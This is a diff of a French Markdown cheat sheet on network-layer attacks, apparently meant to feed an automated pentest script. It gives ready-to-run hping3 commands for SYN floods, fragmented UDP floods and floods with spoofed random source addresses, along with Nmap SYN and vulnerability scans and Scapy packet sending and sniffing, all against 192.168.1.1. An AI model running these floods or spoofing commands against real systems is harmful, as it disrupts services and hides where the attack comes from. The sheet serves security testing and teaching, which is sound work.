@@ -1,87 +1,139 @@
-## 4. `docs/Couche3_Reseau/cheat-couche3.md`
+**Chemin :**  
+`docs/Couche3_Reseau/cheat-couche_Reseau.md`
 
 ```markdown
-# Couche 3 (Réseau) – Hping3
-**Version Testée : Hping3 3.0.x**  
-**Attaque Ciblée : DDoS (flood TCP/UDP/ICMP) & Tests de Firewall**
 
-*Document intégrant des annotations pour l’automatisation et la génération de rapports via le script.*
+# Couche 3 (Réseau) – Attaques et Outils
 
----
+**Version Testée :**
+- Hping3 3.0.x
+- Nmap 7.x
+- Scapy 2.x
 
-## Sommaire
+**Description :**  
+Ce document recense les outils et attaques disponibles pour la couche Réseau du modèle OSI. La couche 3 est responsable du routage et de la transmission des paquets IP.  
+Les outils présentés permettent d’effectuer des attaques de type DoS, scans de ports, spoofing IP et manipulation de paquets.  
+Le script automatisé analysera ce fichier pour :
+- Lister les outils disponibles (sections marquées par **"### Outil:"**),
+- Afficher, pour chaque outil, les attaques possibles (sections marquées par **"#### Attaque:"**),
+- Proposer les commandes associées pour chaque attaque (commandes présentées dans des blocs de code sous **"###### Commande:"**).
 
-1. [Introduction](#introduction)
-2. [Installation & Pré-requis](#installation--pré-requis)
-3. [Commandes Clés](#commandes-clés)
-4. [Exemples d’Attaques](#exemples-dattaques)
-5. [Limitations & Contre-mesures](#limitations--contre-mesures)
-6. [Intégration avec le Script](#intégration-avec-le-script)
-7. [Références & Ressources](#références--ressources)
-
----
-
-## Introduction
-
-Hping3 est un outil puissant pour manipuler des paquets TCP/IP. Il est utilisé pour :
-- Tester la robustesse des firewalls (via fragmentation, flags spécifiques).
-- Lancer des attaques DoS telles que SYN flood ou UDP flood.
-- Réaliser des analyses de performance (ping avancé, traceroute).
+Vous pourrez enrichir ce fichier ultérieurement sans modifier le script.
 
 ---
 
-## Installation & Pré-requis
+### Outil: Hping3
+**Description :**  
+Hping3 est un outil en ligne de commande de manipulation de paquets TCP/IP. Il est utilisé pour tester la résistance des systèmes, mener des attaques DoS et analyser le comportement des réseaux.
 
-- **Sur Debian/Ubuntu :**
+#### Attaque: SYN Flood
+*Détails de l'attaque :*  
+Envoyer en continu des paquets SYN pour saturer la cible et perturber le fonctionnement des services.
+##### Commandes Clés
+**Commande: Lancer SYN Flood**
 ```bash
-sudo apt update
-sudo apt install hping3
-•	Privilèges :
-Exécution en tant qu’utilisateur avec droits suffisants selon les tests réalisés.
-________________________________________
-Commandes Clés
-1. SYN Flood
 hping3 -S -p 80 --flood -d 1000 192.168.1.1
+```
 Détails :
-•	-S active le flag SYN.
-•	--flood pour un envoi continu.
-•	-d 1000 définit la taille du paquet.
-2. UDP Flood avec fragmentation
+- Port cible : 80.
+- Taille du paquet : 1000 octets.
+- Option --flood pour envoi continu.
+
+#### Attaque: UDP Flood avec fragmentation
+*Détails de l'attaque :*  
+Envoyer massivement des paquets UDP fragmentés afin de saturer la bande passante de la cible.
+##### Commandes Clés
+**Commande: Lancer UDP Flood avec fragmentation**
+```bash
 hping3 --udp -p 53 --frag -d 2000 --flood 192.168.1.1
+```
 Détails :
-•	--udp active le mode UDP.
-•	--frag active la fragmentation.
-•	-d 2000 définit le payload.
-3. IP Spoofing avec adresses sources aléatoires
+- Port cible : 53.
+- Payload de 2000 octets.
+- Fragmentation activée (--frag).
+
+#### Attaque: IP Spoofing
+*Détails de l'attaque :*  
+Envoyer des paquets avec des adresses source aléatoires pour masquer l’origine et compliquer la traçabilité.
+##### Commandes Clés
+**Commande: Lancer IP Spoofing avec Hping3**
+```bash
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
+```
 Détails :
-•	-c 10000 indique le nombre de paquets.
-•	--rand-source génère des adresses IP sources aléatoires.
-________________________________________
-Exemples d’Attaques
-•	Découverte de ports :
-hping3 -S <IP_CIBLE> --scan 1-1000
-•	Évasion de firewall :
-En fragmentant les paquets ou en modifiant les flags pour contourner le filtrage.
-________________________________________
-Limitations & Contre-mesures
-•	Limitations : 
-o	Dépend de la bande passante de l’attaquant.
-o	Détectable par des équipements de sécurité modernes.
-•	Contre-mesures : 
-o	Déployer des solutions anti-DDoS et de filtrage de paquets.
-o	Utiliser des systèmes IDS/IPS pour surveiller les anomalies.
-________________________________________
-Intégration avec le Script
-•	Annotations :
-Le script analysera chaque commande exécutée, enregistrera les paramètres et générera un rapport d’activité complet.
-•	Suivi des actions :
-Les logs d’exécution seront intégrés pour un récapitulatif automatisé.
-________________________________________
-Références & Ressources
-•	Site Officiel d’Hping3
-•	GitHub Hping
-•	RFC 791 (IP)
-•	RFC 793 (TCP)
+- Envoi de 10 000 paquets.
+- Taille du paquet : 120 octets.
+- Port cible : 80.
+- Génération d’adresses source aléatoires (--rand-source).
 
 ---
+
+### Outil: Nmap
+**Description :**  
+Nmap est un scanner de réseau réputé, utilisé pour découvrir des hôtes, identifier les ports ouverts et réaliser des analyses de version et de vulnérabilités grâce à ses scripts NSE.
+
+#### Attaque: Scan de ports rapide
+*Détails de l'attaque :*  
+Réaliser un scan SYN rapide pour identifier les ports ouverts sur la cible.
+##### Commandes Clés
+**Commande: Lancer un scan SYN rapide**
+```bash
+nmap -sS -T4 192.168.1.1
+```
+Détails :
+- Scan SYN (-sS) avec timing agressif (-T4).
+
+#### Attaque: Scan de vulnérabilités
+*Détails de l'attaque :*  
+Utiliser Nmap pour détecter des services vulnérables via ses scripts NSE.
+##### Commandes Clés
+**Commande: Scan complet avec scripts NSE**
+```bash
+nmap -sV --script=vuln 192.168.1.1
+```
+Détails :
+- Détection de version (-sV) et utilisation des scripts de vulnérabilité (--script=vuln).
+
+---
+
+### Outil: Scapy
+**Description :**  
+Scapy est une bibliothèque Python interactive pour la manipulation de paquets. Elle permet de créer, modifier, envoyer et analyser des paquets IP de façon très flexible.
+
+#### Attaque: Génération de paquets personnalisés
+*Détails de l'attaque :*  
+Créer et envoyer des paquets sur mesure pour tester la réaction de la cible à des scénarios spécifiques.
+##### Commandes Clés
+**Commande: Envoyer un paquet ICMP personnalisé**
+```bash
+python -c "from scapy.all import *; send(IP(dst='192.168.1.1')/ICMP())"
+```
+Détails :
+- Envoi d’un paquet ICMP vers 192.168.1.1 via Scapy.
+
+#### Attaque: Analyse du trafic réseau
+*Détails de l'attaque :*  
+Capturer et afficher un résumé du trafic réseau pour analyser le comportement des paquets.
+##### Commandes Clés
+**Commande: Sniffer 10 paquets sur l'interface eth0**
+```bash
+python -c "from scapy.all import *; sniff(iface='eth0', count=10, prn=lambda x: x.summary())"
+```
+Détails :
+- Capture de 10 paquets sur l’interface eth0 et affichage d’un résumé.
+
+---
+
+## Précautions Légales & Disclaimer
+**Attention :**  
+L'utilisation de ces outils et commandes doit être réalisée dans un cadre légal et exclusivement en environnement de test. Toute utilisation malveillante est strictement interdite.
+
+---
+
+## Références & Ressources
+- [Hping3 Officiel](http://www.hping.org/)
+- [Nmap Official Website](https://nmap.org/)
+- [Scapy Documentation](https://scapy.readthedocs.io/)
+- [RFC 793 (TCP)](https://tools.ietf.org/html/rfc793)
+- [RFC 791 (IP)](https://tools.ietf.org/html/rfc791)
+```
